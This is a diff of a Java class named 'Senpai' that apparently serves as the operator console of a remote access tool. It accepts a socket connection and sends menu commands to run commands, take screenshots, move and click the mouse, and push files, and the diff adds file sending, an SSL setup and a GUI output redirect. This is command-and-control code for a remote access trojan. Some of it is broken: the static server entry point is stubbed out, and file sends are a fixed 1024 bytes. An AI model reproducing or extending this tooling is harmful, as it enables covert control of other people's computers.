@@ -1,37 +1,93 @@
 import javax.imageio.ImageIO;
+import javax.net.ssl.KeyManagerFactory;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLServerSocket;
+import javax.net.ssl.SSLServerSocketFactory;
+import javax.swing.*;
+import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.security.KeyStore;
+import java.util.Arrays;
 import java.util.Scanner;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class Senpai {
+    public InputStream test;
     public static void main(String[]args){
         int name = 'm'+'a'+'s'+'t';
         initiateServer(name,Integer.parseInt(args[1]));
     }
+    public Senpai(int port,JTextArea area,PipedOutputStream input){
+        int name = 'm'+'a'+'s'+'t';
+        initiateServer(name,port,area,input,true);
+    }
     public static void initiateServer(int id,int port){
-        final ExecutorService pool = Executors.newFixedThreadPool(10);
+        //initiateServer(id,port,null,null,false);
+    }
+    public SSLServerSocket buildSecurity(Scanner console,int port){
+        try{
+            SSLContext context = SSLContext.getInstance("SSL");
+            KeyManagerFactory factory = KeyManagerFactory.getInstance("SUNX509");
+            KeyStore store = KeyStore.getInstance("JKS");
 
+            System.out.println("login password: ");
+            char[]password = console.next().toCharArray();
+            store.load(new FileInputStream("jts4e.keys"),password);
+            factory.init(store,password);
+            context.init(factory.getKeyManagers(),null,null);
+            Arrays.fill(password,'0');
+            SSLServerSocketFactory secure = context.getServerSocketFactory();
+            SSLServerSocket server = (SSLServerSocket)secure.createServerSocket(port);
+            String[]cipherSuites = server.getSupportedCipherSuites();
+            server.setEnabledCipherSuites(cipherSuites);
+            return server;
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+        return null;
+    }
+    public void initiateServer(int id, int port, JTextArea area, PipedOutputStream input,boolean redirect){
+        final ExecutorService pool = Executors.newFixedThreadPool(10);
         Runnable task = ()-> {
             try{
                 ServerSocket server = new ServerSocket(port);
+
+                PrintStream printStream = new PrintStream(new CustomStream(area));
+                PipedInputStream connect = new PipedInputStream(input);
+
+                if(redirect){
+                    System.setOut(printStream);
+                    System.setErr(printStream);
+                    System.setIn(connect);
+                }
+                //SSLServerSocket = buildSecurity(console,port);
                 System.out.println(server.getLocalPort());
                 System.out.println("waiting for clients at "+server.getLocalPort()+"...");
                 while(true){
                     Socket sock = server.accept();
-                    System.out.println(id+" successfully connected to socket "+sock.getPort());
 
-                    Scanner console = new Scanner(System.in);
+                    System.out.println(id+" successfully connected to socket "+sock.getPort());
 
                     DataInputStream in = new DataInputStream(sock.getInputStream());
                     DataOutputStream out = new DataOutputStream(sock.getOutputStream());
 
+                    Scanner console = new Scanner(System.in);
                     while(true) {
-                        System.out.println("what would you like to do [1 = command 2 = snapshot 3 = get output 4 = move mouse 5 = press mouse -1 = exit]");
-                        int flag = console.nextInt();
+                        System.out.println("what would you like to do [1 = command 2 = snapshot 3 = get output 4 = move mouse 5 = press mouse 6 = send file -1 = exit]");
+                        int flag = 0;
+                        flag = console.nextInt();
+                        /*try{
+                            flag = console.nextInt();
+                        }catch(IllegalArgumentException e){
+                            System.out.println("Error wrong usage please try again");
+                            continue;
+                        }*/
 
                         if (flag == -1) {
                             out.writeByte(flag);
@@ -68,7 +124,6 @@ public class Senpai {
                         }else{
                             out.writeByte(flag);
                         }
-
 
                         switch (in.readByte()){
                             case 1:
@@ -112,7 +167,6 @@ public class Senpai {
                                 break;
                             case 4:
                                 System.out.println("moving mouse");
-
                                 if(in.readByte() == 999){
                                     System.out.println("moved mouse");
                                 }else{
@@ -125,6 +179,30 @@ public class Senpai {
                                 }else{
                                     System.out.println("mouse not clicked");
                                 }
+                                break;
+                            case 6:
+                                System.out.println("enter file to send with extension ");
+                                String fileName = console.next();
+
+                                File read = new File(fileName);
+                                BufferedInputStream fileStream = new BufferedInputStream(new FileInputStream(read));
+
+                                byte[]buff = new byte[1024];
+                                fileStream.read(buff,0,buff.length);
+
+                                //out.writeByte(6);//flag
+                                out.writeUTF(fileName);
+
+                                if(buff.length > 0){
+                                    System.out.println("sending "+read.getAbsolutePath());
+                                    out.writeInt(buff.length);
+                                    out.write(buff,0,buff.length);
+                                    System.out.println(read.getAbsolutePath()+" sent");
+                                    fileStream.close();
+                                }else{
+                                    System.out.println("file not sent");
+                                }
+                                break;
                             default:
                                 System.out.println("nothing");
                                 break;
@@ -135,9 +213,32 @@ public class Senpai {
             }catch(IOException e){
                 e.printStackTrace();
                 System.out.println("error with IO");
+            }catch(Exception e){
+                e.printStackTrace();
             }
         };
         Thread thread = new Thread(task);
         pool.submit(thread);
     }
+    public class CustomStream extends OutputStream{
+        public JTextArea field;
+        public int size = 0;
+        public CustomStream(JTextArea area){
+            this.field = area;
+            size = field.getDocument().getLength();
+        }
+        @Override
+        public void write(int i){
+            char b = (char)i;
+            String c = ""+b;
+            field.append(c);
+            field.setCaretPosition(field.getDocument().getLength());
+            field.update(field.getGraphics());
+
+            if(field.getText().length() > 1000){
+                field.setText("");
+            }
+        }
+    }
 }
+
